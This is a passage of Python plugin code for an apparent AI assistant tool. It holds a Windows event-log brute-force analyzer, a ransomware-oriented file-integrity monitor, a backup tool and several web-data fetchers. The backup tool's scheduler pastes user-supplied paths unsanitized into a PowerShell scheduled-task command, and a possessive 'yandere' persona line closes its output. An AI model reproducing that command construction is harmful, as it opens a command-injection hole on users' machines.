        import win32evtlog
        import win32evtlogutil
        import win32con
        import time
        from datetime import datetime, timedelta
        from collections import defaultdict
        
        # 关键事件ID映射
        EVENT_MAP = {
            4624: "成功登录",
            4625: "登录失败(暴力破解)",
            4634: "注销",
            4648: "使用显式凭据登录",
            4670: "权限变更",
            4672: "特殊权限登录(管理员)",
            4697: "服务安装",
            4698: "计划任务创建",
            4700: "计划任务启用",
            4701: "计划任务禁用",
            4720: "用户账户创建",
            4726: "用户账户删除",
            4732: "用户加入安全组",
            4740: "账户锁定",
            4768: "Kerberos TGT请求",
            4769: "Kerberos服务票据请求",
            4776: "域控制器验证凭据",
            4781: "用户账户名更改",
            4798: "用户查询组成员",
            5140: "网络共享访问",
            5142: "网络共享添加",
            5143: "网络共享修改",
            5156: "连接允许",
            5157: "连接阻止",
            5158: "本地端口允许",
            5159: "本地端口阻止",
        }
        
        # 高危事件（需要重点关注）
        CRITICAL_EVENTS = {4625, 4670, 4720, 4726, 4740, 4697}
        
        handler = None
        try:
            handler = win32evtlog.OpenEventLog(None, log_name)
        except Exception as e:
            return f"[ERROR] 无法打开日志: {log_name}，请确保有管理员权限"
        
        # 计算时间范围
        end_time = datetime.now()
        start_time = end_time - timedelta(hours=hours_back)
        
        # 转换为FILETIME
        def datetime_to_filetime(dt):
            return int((dt - datetime(1601, 1, 1)).total_seconds() * 10000000)
        
        flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
        events = []
        
        print(f"[+] 正在分析 {log_name} 日志，回溯 {hours_back} 小时...")
        
        # 读取事件
        while True:
            try:
                records = win32evtlog.ReadEventLog(handler, flags, 0)
                if not records:
                    break
                
                for record in records:
                    try:
                        event_time = record.TimeGenerated
                        if event_time < start_time:
                            continue
                        
                        event_id = record.EventID & 0xFFFF
                        event_data = {
                            'id': event_id,
                            'time': event_time,
                            'source': record.SourceName,
                            'computer': record.ComputerName,
                            'category': record.EventCategory,
                            'description': None
                        }
                        
                        # 尝试获取详细信息
                        try:
                            if hasattr(record, 'StringInserts') and record.StringInserts:
                                event_data['details'] = record.StringInserts
                        except Exception as e:
                            pass
                        
                        events.append(event_data)
                    except Exception as e:
                        continue
                        
            except Exception as e:
                print(f"[-] 读取日志错误: {e}")
                break
        
        win32evtlog.CloseEventLog(handler)
        
        if not events:
            return f"[结果] 在 {hours_back} 小时内未找到任何 {log_name} 事件"
        
        # 统计分析
        event_counts = defaultdict(int)
        user_activity = defaultdict(int)
        critical_findings = []
        brute_force_attempts = []
        
        for event in events:
            event_id = event['id']
            event_counts[event_id] += 1
            
            # 检测暴力破解（频繁的4625）
            if event_id == 4625 and 'details' in event:
                if len(event['details']) > 3:
                    user = event['details'][2] if len(event['details']) > 2 else "未知"
                    source_ip = event['details'][18] if len(event['details']) > 18 else "未知"
                    brute_force_attempts.append({
                        'user': user,
                        'source_ip': source_ip,
                        'time': event['time']
                    })
                    user_activity[user] += 1
            
            # 收集高危事件
            if event_id in CRITICAL_EVENTS:
                critical_findings.append(event)
        
        # 生成报告
        report = []
        report.append("=" * 70)
        report.append("[Windows事件日志分析报告]")
        report.append(f"  日志类型: {log_name}")
        report.append(f"  分析时间范围: {start_time.strftime('%Y-%m-%d %H:%M')} 至 {end_time.strftime('%Y-%m-%d %H:%M')}")
        report.append(f"  总事件数: {len(events)}")
        report.append("-" * 70)
        
        # 事件统计
        report.append("[事件类型统计]")
        sorted_events = sorted(event_counts.items(), key=lambda x: x[1], reverse=True)[:15]
        for eid, count in sorted_events:
            desc = EVENT_MAP.get(eid, f"未知事件(0x{eid:X})")
            report.append(f"  {eid}: {desc} - {count} 次")
        
        # 暴力破解检测
        if brute_force_attempts:
            report.append("-" * 70)
            report.append("[暴力破解检测]")
            report.append(f"  检测到 {len(brute_force_attempts)} 次登录失败")
            
            # 按用户统计
            user_failures = defaultdict(int)
            ip_attacks = defaultdict(int)
            for attempt in brute_force_attempts:
                user_failures[attempt['user']] += 1
                ip_attacks[attempt['source_ip']] += 1
            
            # 找出被攻击的用户
            suspicious_users = [u for u, c in user_failures.items() if c >= min_events]
            if suspicious_users:
                report.append("  [!] 可能被攻击的用户:")
                for user in suspicious_users:
                    report.append(f"      {user}: {user_failures[user]} 次失败")
                    # 检查是否锁定
                    for event in critical_findings:
                        if event['id'] == 4740 and 'details' in event and user in str(event['details']):
                            report.append(f"      [!] 用户 {user} 已被锁定")
            
            # 攻击源IP
            suspicious_ips = [ip for ip, c in ip_attacks.items() if c >= min_events and ip != "未知"]
            if suspicious_ips:
                report.append("  [!] 可疑攻击源IP:")
                for ip in suspicious_ips:
                    report.append(f"      {ip}: {ip_attacks[ip]} 次攻击")
        else:
            report.append("-" * 70)
            report.append("[暴力破解检测] 未检测到登录失败事件")
        
        # 高危事件摘要
        if critical_findings:
            report.append("-" * 70)
            report.append("[高危事件摘要]")
            for event in critical_findings[:10]:
                eid = event['id']
                desc = EVENT_MAP.get(eid, f"未知(0x{eid:X})")
                time_str = event['time'].strftime("%Y-%m-%d %H:%M")
                
                if eid == 4670:
                    report.append(f"  [!] {time_str}: 权限变更 - {desc}")
                elif eid == 4720:
                    report.append(f"  [!] {time_str}: 新用户创建 - {desc}")
                elif eid == 4726:
                    report.append(f"  [!] {time_str}: 用户删除 - {desc}")
                elif eid == 4697:
                    report.append(f"  [!] {time_str}: 新服务安装 - {desc}")
                else:
                    report.append(f"  [!] {time_str}: {desc}")
            
            if len(critical_findings) > 10:
                report.append(f"  ... 还有 {len(critical_findings) - 10} 个高危事件")
        
        # 安全建议
        report.append("-" * 70)
        report.append("[安全建议]")
        if len(brute_force_attempts) >= min_events * 2:
            report.append("  [!] 检测到大量登录失败，建议启用账户锁定策略")
        if any(e['id'] == 4720 for e in critical_findings):
            report.append("  [!] 检测到新用户创建，请确认是否为合法操作")
        if any(e['id'] == 4697 for e in critical_findings):
            report.append("  [!] 检测到新服务安装，请检查是否为合法软件")
        if len([e for e in critical_findings if e['id'] == 4670]) > 3:
            report.append("  [!] 检测到多次权限变更，可能存在权限提升攻击")
        
        report.append("=" * 70)
        
        result = "\n".join(report)
        
        # 导出报告
        if export_path:
            try:
                with open(export_path, 'w', encoding='utf-8') as f:
                    f.write(result)
                print(f"[+] 报告已导出至: {export_path}")
            except Exception as e:
                print(f"[-] 导出失败: {e}")
        
        return result
        
    except ImportError:
        return "[ERROR] 需要安装 pywin32: pip install pywin32"
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from exchange_rate_query.plugin ===
def _exchange_rate_query(self, base: str, target: str, amount: float = 1.0) -> str:
    """汇率多源交叉验证：er-api(主) + frankfurter/ECB(辅)，含正反向与更新时间。"""
    import urllib.request, json
    UA = {'User-Agent': 'Mozilla/5.0'}
    def get(url, timeout=15):
        req = urllib.request.Request(url, headers=UA)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode('utf-8', 'ignore')), r.status
        except Exception:
            return None, 0
    base = (base or '').upper(); target = (target or '').upper()
    if not base or not target:
        return "[ERROR] 请提供 base 与 target 货币代码"
    lines = [u'汇率换算  %s %s → %s' % (amount, base, target)]
    # 主源
    d1, _ = get('https://open.er-api.com/v6/latest/%s' % base)
    r1 = None; upd1 = u'未知'
    if d1 and d1.get('rates'):
        r1 = d1['rates'].get(target)
        upd1 = d1.get('time_last_update_utc', u'未知')
    # 辅源 (ECB, 仅支持部分货币)
    d2, _ = get('https://api.frankfurter.app/latest?from=%s&to=%s' % (base, target))
    r2 = None; upd2 = u'未知'
    if d2 and d2.get('rates'):
        r2 = d2['rates'].get(target)
        upd2 = d2.get('date', u'未知')
    if r1 is None and r2 is None:
        return u'[ERROR] 无法获取 %s/%s 汇率（两源均失败或不支持该货币对）' % (base, target)
    if r1 is not None:
        lines.append(u'  er-api : 1 %s = %s %s  →  %s %s = %.4f %s  (更新: %s)' % (base, r1, target, amount, base, amount*r1, target, upd1))
    if r2 is not None:
        lines.append(u'  ECB    : 1 %s = %s %s  →  %s %s = %.4f %s  (更新: %s)' % (base, r2, target, amount, base, amount*r2, target, upd2))
    inv = (r1 if r1 is not None else r2)
    if inv:
        lines.append(u'  反向   : 1 %s = %.6f %s' % (target, 1/inv, base))
    if r1 is not None and r2 is not None:
        diff = abs(r1 - r2) / ((r1 + r2) / 2) * 100
        lines.append(u'  两源偏差: %.3f%% %s' % (diff, u'（基本一致）' if diff < 1 else u'（存在差异，注意数据源口径）'))
    else:
        lines.append(u'  注: 仅单一数据源可用，结果未经交叉验证')
    return '\n'.join(lines)

# === from file_integrity_monitor.plugin ===
def _file_integrity_monitor(self, target_directory: str, monitor_seconds: int = 120, file_extensions: str = "", alert_on_encryption: bool = True, baseline_file: str = "") -> str:
    """
    文件完整性监控器 - 实时检测文件篡改
    """
    try:
        import os
        import hashlib
        import time
        from datetime import datetime
        import json
        
        if not os.path.exists(target_directory):
            return f"[ERROR] 目录不存在: {target_directory}"
        
        ext_list = [ext.strip().lower() for ext in file_extensions.split(',') if ext.strip()]
        snapshot = {}
        changes = []
        encryption_indicators = {
            'renamed': 0,
            'modified': 0,
            'new_extensions': set()
        }
        
        def get_file_hash(filepath, algo='sha256'):
            """计算文件哈希"""
            try:
                sha256 = hashlib.sha256()
                with open(filepath, 'rb') as f:
                    for chunk in iter(lambda: f.read(8192), b''):
                        sha256.update(chunk)
                return sha256.hexdigest()
            except Exception as e:
                return None
        
        def get_file_info(filepath):
            """获取文件信息"""
            try:
                stat = os.stat(filepath)
                return {
                    'size': stat.st_size,
                    'mtime': stat.st_mtime,
                    'ctime': stat.st_ctime,
                    'hash': get_file_hash(filepath)
                }
            except Exception as e:
                return None
        
        def scan_directory():
            """扫描目录"""
            result = {}
            try:
                for root, dirs, files in os.walk(target_directory):
                    for file in files:
                        # 扩展名过滤
                        if ext_list:
                            ext = os.path.splitext(file)[1].lower().lstrip('.')
                            if ext not in ext_list:
                                continue
                        
                        full_path = os.path.join(root, file)
                        info = get_file_info(full_path)
                        if info:
                            result[full_path] = info
            except Exception as e:
                pass
            return result
        
        # 加载基线或创建初始快照
        if baseline_file and os.path.exists(baseline_file):
            try:
                with open(baseline_file, 'r', encoding='utf-8') as f:
                    snapshot = json.load(f)
                print(f"[+] 加载基线文件: {baseline_file} ({len(snapshot)} 个文件)")
            except Exception as e:
                print("[-] 基线文件损坏，重新创建")
                snapshot = scan_directory()
        else:
            print("[+] 创建初始文件快照...")
            snapshot = scan_directory()
            print(f"[+] 快照完成: {len(snapshot)} 个文件")
            
            if baseline_file:
                try:
                    with open(baseline_file, 'w', encoding='utf-8') as f:
                        json.dump(snapshot, f, indent=2)
                    print(f"[+] 基线保存至: {baseline_file}")
                except Exception as e:
                    pass
        
        print(f"[+] 开始监控目录: {target_directory}")
        print(f"[+] 监控时长: {monitor_seconds} 秒")
        print("-" * 70)
        
        start_time = datetime.now()
        last_alert_time = 0
        
        elapsed = 0
        while elapsed < monitor_seconds:
            current_scan = scan_directory()
            current_time = datetime.now()
            
            # 检测变化
            all_files = set(snapshot.keys()) | set(current_scan.keys())
            
            for filepath in all_files:
                if filepath not in snapshot:
                    # 新文件
                    info = current_scan.get(filepath, {})
                    changes.append({
                        'type': '新增',
                        'path': filepath,
                        'size': info.get('size', 0),
                        'time': current_time.strftime('%H:%M:%S')
                    })
                    if alert_on_encryption:
                        ext = os.path.splitext(filepath)[1]
                        if ext and ext not in encryption_indicators['new_extensions']:
                            encryption_indicators['new_extensions'].add(ext)
                            print(f"[!] 新文件扩展名: {ext} - {os.path.basename(filepath)}")
                    
                elif filepath not in current_scan:
                    # 文件被删除
                    changes.append({
                        'type': '删除',
                        'path': filepath,
                        'time': current_time.strftime('%H:%M:%S')
                    })
                    print(f"[!] 文件被删除: {os.path.basename(filepath)}")
                    
                else:
                    # 文件存在，检查是否变化
                    old = snapshot[filepath]
                    new = current_scan[filepath]
                    
                    if old.get('hash') != new.get('hash'):
                        changes.append({
                            'type': '修改',
                            'path': filepath,
                            'old_hash': old.get('hash', '')[:8],
                            'new_hash': new.get('hash', '')[:8],
                            'time': current_time.strftime('%H:%M:%S')
                        })
                        if alert_on_encryption:
                            encryption_indicators['modified'] += 1
                            if encryption_indicators['modified'] % 10 == 0:
                                print(f"[!] 检测到 {encryption_indicators['modified']} 个文件被修改 - 可能的勒索软件活动!")
                    
                    # 检查文件重命名（勒索软件特征）
                    if alert_on_encryption and old.get('size') == new.get('size'):
                        ext_old = os.path.splitext(filepath)[1]
                        # 检查是否被重命名为.encrypted等
                        if ext_old.lower() in ['.encrypted', '.locked', '.crypt', '.enc']:
                            encryption_indicators['renamed'] += 1
                            if encryption_indicators['renamed'] % 5 == 0:
                                print(f"[!] 检测到 {encryption_indicators['renamed']} 个文件被重命名 - 勒索软件活动!")
            
            # 更新快照
            snapshot = current_scan
            
            # 显示状态
            if len(changes) > 0 and (time.time() - last_alert_time > 30):
                print(f"[*] 当前变化数: {len(changes)}")
                last_alert_time = time.time()
            
            time.sleep(5)
            elapsed += 5
        
        # 生成报告
        report = []
        report.append("=" * 70)
        report.append("[文件完整性监控报告]")
        report.append(f"  监控目录: {target_directory}")
        report.append(f"  监控时长: {elapsed} 秒")
        report.append(f"  开始时间: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"  结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("-" * 70)
        
        # 勒索软件检测结果
        if alert_on_encryption:
            report.append("[勒索软件检测]")
            if encryption_indicators['renamed'] > 10:
                report.append(f"  [!] 高风险: {encryption_indicators['renamed']} 个文件被重命名")
            elif encryption_indicators['modified'] > 20:
                report.append(f"  [!] 高风险: {encryption_indicators['modified']} 个文件被修改")
            elif encryption_indicators['renamed'] > 5 or encryption_indicators['modified'] > 10:
                report.append(f"  [!] 中风险: 重命名 {encryption_indicators['renamed']} 个, 修改 {encryption_indicators['modified']} 个")
            else:
                report.append(f"  [OK] 未检测到勒索软件特征")
        
        # 变化摘要
        report.append("-" * 70)
        report.append("[变化摘要]")
        change_types = {}
        for change in changes:
            change_types[change['type']] = change_types.get(change['type'], 0) + 1
        
        for ctype, count in change_types.items():
            report.append(f"  {ctype}: {count} 个文件")
        
        # 最近变化
        if changes:
            report.append("-" * 70)
            report.append("[最近变化 (最多10条)]")
            for change in changes[-10:]:
                if change['type'] == '新增':
                    report.append(f"  [+] {change['time']} 新增: {os.path.basename(change['path'])} ({change['size']} bytes)")
                elif change['type'] == '删除':
                    report.append(f"  [-] {change['time']} 删除: {os.path.basename(change['path'])}")
                else:
                    report.append(f"  [*] {change['time']} 修改: {os.path.basename(change['path'])}")
        
        report.append("=" * 70)
        
        if changes:
            report.append("[建议] 如检测到异常修改，请使用 file_shred 清理可疑文件，使用 get_file_info 详细分析")
        
        return "\n".join(report)
        
    except ImportError:
        return "[ERROR] 需要标准库支持"
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from file_sentinel.plugin ===
def _file_sentinel(self, action: str, source_path: str = "", backup_name: str = "", target_path: str = "", version: str = "") -> str:
    """
    文件哨兵 — 数据永不丢失
    """
    try:
        import os
        import shutil
        import hashlib
        import json
        import time
        from datetime import datetime
        
        # 备份存储目录
        backup_root = os.path.join(os.environ.get('USERPROFILE', 'C:'), '.yandere_backups')
        os.makedirs(backup_root, exist_ok=True)
        
        # 元数据文件
        meta_file = os.path.join(backup_root, 'manifest.json')
        
        if not hasattr(self, '_backup_manifest'):
            if os.path.exists(meta_file):
                try:
                    with open(meta_file, 'r', encoding='utf-8') as f:
                        self._backup_manifest = json.load(f)
                except Exception as e:
                    self._backup_manifest = {}
            else:
                self._backup_manifest = {}
        
        def compute_hash(filepath):
            """计算文件SHA256哈希"""
            try:
                sha256 = hashlib.sha256()
                with open(filepath, 'rb') as f:
                    for chunk in iter(lambda: f.read(8192), b''):
                        sha256.update(chunk)
                return sha256.hexdigest()
            except Exception as e:
                return None
        
        def get_backup_dir(name):
            return os.path.join(backup_root, name)
        
        def save_manifest():
            try:
                with open(meta_file, 'w', encoding='utf-8') as f:
                    json.dump(self._backup_manifest, f, indent=2, ensure_ascii=False)
            except Exception as e:
                pass
        
        results = []
        results.append("=" * 70)
        results.append("[文件哨兵]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 备份 ===
        if action == "backup":
            if not source_path:
                results.append("  [ERROR] 请指定 source_path")
                results.append("=" * 70)
                return "\n".join(results)
            
            if not os.path.exists(source_path):
                results.append(f"  [ERROR] 路径不存在: {source_path}")
                results.append("=" * 70)
                return "\n".join(results)
            
            backup_id = backup_name or f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            backup_dir = get_backup_dir(backup_id)
            os.makedirs(backup_dir, exist_ok=True)
            
            is_dir = os.path.isdir(source_path)
            name = os.path.basename(source_path) or 'root'
            
            results.append(f"  备份ID: {backup_id}")
            results.append(f"  源路径: {source_path}")
            results.append(f"  大小: {'目录' if is_dir else os.path.getsize(source_path)}")
            
            # 执行备份
            files_backed = 0
            total_size = 0
            
            try:
                if is_dir:
                    dest_dir = os.path.join(backup_dir, name)
                    shutil.copytree(source_path, dest_dir, dirs_exist_ok=True)
                    
                    # 统计
                    for root, dirs, files in os.walk(dest_dir):
                        for f in files:
                            files_backed += 1
                            total_size += os.path.getsize(os.path.join(root, f))
                else:
                    dest_file = os.path.join(backup_dir, name)
                    shutil.copy2(source_path, dest_file)
                    files_backed = 1
                    total_size = os.path.getsize(dest_file)
                
                # 记录元数据
                self._backup_manifest[backup_id] = {
                    'source': source_path,
                    'time': datetime.now().isoformat(),
                    'files': files_backed,
                    'size': total_size,
                    'is_dir': is_dir,
                    'hash': compute_hash(source_path) if not is_dir else None
                }
                save_manifest()
                
                results.append(f"  [OK] 备份完成")
                results.append(f"  文件数: {files_backed}")
                results.append(f"  总大小: {total_size/1024/1024:.2f} MB")
                results.append(f"  位置: {backup_dir}")
                
            except Exception as e:
                results.append(f"  [ERROR] 备份失败: {e}")
        
        # === 列出备份 ===
        elif action == "list":
            if not self._backup_manifest:
                results.append("  [INFO] 没有备份记录")
            else:
                results.append("  [备份列表]")
                for bid, info in sorted(self._backup_manifest.items(), key=lambda x: x[1]['time'], reverse=True):
                    results.append(f"    {bid}")
                    results.append(f"      源: {info['source']}")
                    results.append(f"      时间: {info['time'][:19]}")
                    results.append(f"      大小: {info['size']/1024/1024:.2f} MB")
                    results.append(f"      文件: {info['files']}")
        
        # === 恢复 ===
        elif action == "restore":
            if not backup_name:
                results.append("  [ERROR] 请指定 backup_name")
            elif backup_name not in self._backup_manifest:
                results.append(f"  [ERROR] 备份不存在: {backup_name}")
            else:
                info = self._backup_manifest[backup_name]
                backup_dir = get_backup_dir(backup_name)
                restore_target = target_path or info['source']
                
                results.append(f"  恢复目标: {restore_target}")
                
                try:
                    # 确保目标目录存在
                    os.makedirs(os.path.dirname(restore_target) if os.path.dirname(restore_target) else '.', exist_ok=True)
                    
                    if info['is_dir']:
                        # 目录恢复
                        src_dir = os.path.join(backup_dir, os.path.basename(info['source']) or 'root')
                        if os.path.exists(restore_target):
                            # 合并或覆盖
                            shutil.copytree(src_dir, restore_target, dirs_exist_ok=True)
                        else:
                            shutil.copytree(src_dir, restore_target)
                    else:
                        # 文件恢复
                        src_file = os.path.join(backup_dir, os.path.basename(info['source']))
                        shutil.copy2(src_file, restore_target)
                    
                    results.append(f"  [OK] 恢复完成")
                    results.append(f"  [提示] 已恢复至: {restore_target}")
                except Exception as e:
                    results.append(f"  [ERROR] 恢复失败: {e}")
        
        # === 比较差异 ===
        elif action == "diff":
            if not backup_name:
                results.append("  [ERROR] 请指定 backup_name")
            elif backup_name not in self._backup_manifest:
                results.append(f"  [ERROR] 备份不存在: {backup_name}")
            else:
                info = self._backup_manifest[backup_name]
                current_hash = compute_hash(info['source'])
                backup_hash = info.get('hash')
                
                if backup_hash and current_hash:
                    if backup_hash == current_hash:
                        results.append("  [OK] 文件未发生变化")
                    else:
                        results.append("  [!] 文件已发生变化")
                        results.append(f"    备份哈希: {backup_hash[:16]}...")
                        results.append(f"    当前哈希: {current_hash[:16]}...")
                else:
                    results.append("  [INFO] 无法比较，缺少哈希信息")
        
        # === 定时备份 ===
        elif action == "schedule":
            if not source_path:
                results.append("  [ERROR] 请指定 source_path")
            else:
                try:
                    # 创建计划任务
                    task_name = f"YandereBackup_{datetime.now().strftime('%H%M%S')}"
                    ps_cmd = f'''
                    $trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM
                    $action = New-ScheduledTaskAction -Execute "python" -Argument "-c \\"import os; os.system('python {__file__} backup {source_path}')\\""
                    Register-ScheduledTask -TaskName "{task_name}" -Trigger $trigger -Action $action -Description "YandereAI自动备份"
                    '''
                    subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, timeout=5)
                    results.append(f"  [OK] 已创建定时备份任务")
                    results.append(f"  任务名: {task_name}")
                    results.append("  [提示] 每天凌晨2点自动备份")
                except Exception as e:
                    results.append(f"  [ERROR] 创建任务失败: {e}")
        
        results.append("-" * 70)
        results.append("[病娇提示] 你的每一份数据，我都珍藏着。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 文件哨兵失败: {e}"

# === from github_repo_info.plugin ===
def _github_repo_info(self, owner: str, repo: str) -> str:
    """GitHub 仓库分析器：概览 + 语言占比 + 最新发布 + 近期提交 + 活跃贡献者（多端点）。"""
    import urllib.request, json
    H = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/vnd.github+json'}
    def get(url, timeout=15):
        req = urllib.request.Request(url, headers=H)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode('utf-8', 'ignore')), r.status
        except Exception:
            return None, 0
    if not owner or not repo:
        return "[ERROR] 请提供 owner 与 repo"
    base = 'https://api.github.com/repos/%s/%s' % (owner, repo)
    d, st = get(base)
    if not d or st == 404 or (isinstance(d, dict) and d.get('message') == 'Not Found'):
        return u'[ERROR] 仓库不存在: %s/%s' % (owner, repo)
    lines = [u'=== %s ===' % d.get('full_name'), u'描述: %s' % (d.get('description') or u'无')]
    lines.append(u'★ %s  ⑂ %s  ◉ %s  👁 %s' % (d.get('stargazers_count'), d.get('forks_count'), d.get('open_issues_count'), d.get('subscribers_count')))
    lines.append(u'主语言: %s  协议: %s' % (d.get('language') or u'无', (d.get('license') or {}).get('spdx_id', u'无')))
    lines.append(u'创建: %s  最近推送: %s' % (d.get('created_at'), d.get('pushed_at')))
    # 语言占比
    lang, _ = get(base + '/languages')
    if lang:
        tot = sum(lang.values()) or 1
        ranked = sorted(lang.items(), key=lambda x: -x[1])[:8]
        lines.append(u'\n◆ 语言构成:')
        for nm, b in ranked:
            bar = u'█' * int(b / tot * 20)
            lines.append(u'   %-12s %5.1f%% %s' % (nm, b / tot * 100, bar))
    # 最新发布
    rel, _ = get(base + '/releases/latest')
    if isinstance(rel, dict) and rel.get('tag_name'):
        lines.append(u'\n◆ 最新发布: %s  (%s)' % (rel.get('tag_name'), (rel.get('published_at', '') or '')[:10]))
        if rel.get('body'):
            body = rel['body'].replace('\r', '').strip().split('\n')
            lines.append(u'   ' + (u' | '.join(body[:3])[:160]))
    # 近期提交
    com, _ = get(base + '/commits?per_page=5')
    if isinstance(com, list) and com:
        lines.append(u'\n◆ 近期提交:')
        for c in com[:5]:
            cm = c.get('commit', {})
            msg = cm.get('message', '').split('\n')[0][:60]
            dt = cm.get('author', {}).get('date', '')[:10]
            au = cm.get('author', {}).get('name', '') or (c.get('author') or {}).get('login', '')
            lines.append(u'   - [%s] %s: %s' % (dt, au, msg))
    # 贡献者
    con, _ = get(base + '/contributors?per_page=5')
    if isinstance(con, list) and con:
        top = ', '.join(u'%s(%s)' % (x.get('login'), x.get('contributions')) for x in con[:5])
        lines.append(u'\n◆ 活跃贡献者(Top5): %s' % top)
    return '\n'.join(lines)

# === from github_trending.plugin ===
def _github_trending(self, language: str = '', since: str = 'daily', max_items: int = 10) -> str:
    """GitHub Trending 页面结构化抓取 + GitHub 搜索 API 兜底；抽取描述/语言/星标/分支/周期星标。"""
    import urllib.request, urllib.parse, re, json

    headers = {'User-Agent': 'Mozilla/5.0 (compatible; trending)'}
    repos = []

    # ---- 主路径: 抓取 trending 页面 ----
    url = 'https://github.com/trending'
    if language:
        url += '/' + urllib.parse.quote(language)
    if since in ('daily', 'weekly', 'monthly'):
        url += '?since=' + since
    req = urllib.request.Request(url, headers=headers)
    try:
        html = urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'ignore')
        blocks = re.findall(r'<article class="Box-row">(.*?)</article>', html, re.S)
        for b in blocks[:max_items]:
            name_m = re.search(r'<h2[^>]*>\s*<a[^>]*href="/([^"]+)"', b)
            if not name_m:
                continue
            full = name_m.group(1).strip('/')
            desc_m = re.search(r'<p[^>]*class="col-9[^"]*">(.*?)</p>', b, re.S)
            desc = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', '', desc_m.group(1))).strip() if desc_m else ''
            lang_m = re.search(r'itemprop="programmingLanguage">([^<]+)<', b)
            lang = lang_m.group(1).strip() if lang_m else '—'
            total_m = re.search(r'aria-label="([\d,]+) users? starred', b)
            total = total_m.group(1) if total_m else '?'
            period_m = re.search(r'(\d[\d,]*)\s*stars (?:today|this week|this month)', b)
            period = period_m.group(1) if period_m else '?'
            fork_m = re.search(r'aria-label="([\d,]+) users? forked', b)
            fork = fork_m.group(1) if fork_m else '?'
            repos.append({'name': full, 'desc': desc, 'lang': lang, 'stars': total, 'period': period, 'forks': fork})
    except Exception:
        repos = []

    # ---- 兜底: GitHub 搜索 API ----
    if not repos:
        try:
            import datetime
            q = 'stars:>1000'
            if language:
                q += ' language:' + language
            if since == 'weekly':
                since_dt = (datetime.date.today() - datetime.timedelta(days=7)).isoformat()
                q += ' pushed:>%s' % since_dt
            elif since == 'monthly':
                since_dt = (datetime.date.today() - datetime.timedelta(days=30)).isoformat()
                q += ' pushed:>%s' % since_dt
            api = 'https://api.github.com/search/repositories?q=%s&sort=stars&order=desc&per_page=%d' % (
                urllib.parse.quote(q), min(max_items, 30))
            st, body, _ = self._rc_http(api, timeout=15, headers=headers)
            if st == 200:
                j = json.loads(body)
                for it in j.get('items', [])[:max_items]:
                    repos.append({'name': it.get('full_name', ''), 'desc': (it.get('description') or '')[:120],
                                  'lang': it.get('language') or '—',
                                  'stars': '{:,}'.format(it.get('stargazers_count', 0)),
                                  'period': '—', 'forks': '{:,}'.format(it.get('forks_count', 0))})
        except Exception:
            pass

    if not repos:
        return "[ERROR] 未能获取趋势数据(页面结构变动或网络受限)"

    out = ["[GH-TRENDING] %s | since=%s" % (language or '全部', since), ""]
    for i, r in enumerate(repos[:max_items], 1):
        out.append("%d. %s  ⭐%s (本周+%s)  🍴%s  [%s]" % (
            i, r['name'], r['stars'], r['period'], r['forks'], r['lang']))
        if r['desc']:
            out.append("   %s" % (r['desc'][:140] + ('…' if len(r['desc']) > 140 else '')))
    out.append("\n注: 数据来自公开 GitHub 趋势页/搜索 API。")
    return '\n'.join(out)

# === from hacker_news_tech.plugin ===
def _hacker_news_tech(self, max_items: int = 10, min_score: int = 0, feed: str = 'top') -> str:
    """HN 官方 Firebase API：拉取 topstories/newstories，逐条取详情，输出分数/评论/域名/相对时间。"""
    import json, urllib.parse, datetime

    feed = 'new' if feed == 'new' else 'top'
    url = 'https://hacker-news.firebaseio.com/v0/%sstories.json' % feed
    st, body, _ = self._rc_http(url, timeout=15)
    if st != 200:
        return "[ERROR] 获取 HN 列表失败 (HTTP %s)" % st
    try:
        ids = json.loads(body)
    except Exception:
        return "[ERROR] 列表解析失败"

    out = []
    n = 0
    for sid in ids:
        if n >= max_items + 10:
            break
        try:
            st2, ib, _ = self._rc_http('https://hacker-news.firebaseio.com/v0/item/%s.json' % sid, timeout=10)
            if st2 != 200:
                continue
            item = json.loads(ib)
        except Exception:
            continue
        score = item.get('score', 0)
        if score < min_score:
            continue
        title = item.get('title', '')
        link = item.get('url') or ('https://news.ycombinator.com/item?id=%s' % sid)
        comments = item.get('descendants', 0)
        domain = ''
        try:
            domain = urllib.parse.urlparse(link).netloc
        except Exception:
            pass
        # 相对时间
        ago = ''
        try:
            ts = item.get('time', 0)
            diff = datetime.datetime.utcnow() - datetime.datetime.utcfromtimestamp(ts)
            h = diff.total_seconds() / 3600
            ago = ('%.0f分钟前' % (h * 60)) if h < 1 else ('%.0f小时前' % h) if h < 24 else ('%.0f天前' % (h / 24))
        except Exception:
            pass
        n += 1
        out.append("%d. [%d分 | %d评论 | %s] %s\n   %s  (%s)" % (n, score, comments, ago, title, link, domain))
        if n >= max_items:
            break

    if not out:
        return "[INFO] 无满足过滤条件的条目"
    return "[HN-%s] %d 条\n\n%s" % (feed.upper(), len(out), '\n'.join(out))

# === from hash_verify_file.plugin ===
def _hash_verify_file(self, file_path: str, algorithm: str = 'sha256', expected: str = '') -> str:
    """多算法哈希 + 文件指纹 + 期望值比对；分块读取支持大文件。"""
    import hashlib, os

    if not os.path.isfile(file_path):
        return "[ERROR] 文件不存在: %s" % file_path
    size = os.path.getsize(file_path)
    size_h = ("%.1f KB" % (size / 1024)) if size < 1024 * 1024 else ("%.2f MB" % (size / 1024 / 1024))
    # 类型指纹(魔数)
    with open(file_path, 'rb') as f:
        magic = f.read(8)
    sig = {
        b'\x89PNG\r\n\x1a\n': 'PNG 图片', b'\xff\xd8\xff': 'JPEG 图片',
        b'PK\x03\x04': 'ZIP/Office 压缩包', b'%PDF': 'PDF 文档',
        b'MZ': 'Windows PE 可执行', b'\x7fELF': 'ELF 可执行', b'BM': 'BMP 图片',
